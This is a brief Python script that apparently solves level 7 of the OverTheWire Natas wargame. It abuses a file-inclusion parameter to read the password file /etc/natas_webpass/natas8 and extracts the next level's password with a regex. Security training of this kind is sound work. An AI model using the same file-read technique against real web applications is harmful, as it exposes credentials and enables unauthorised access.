import requests
import re
from requests.auth import HTTPBasicAuth
def solve7(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    resp = session.get("http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8")
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw
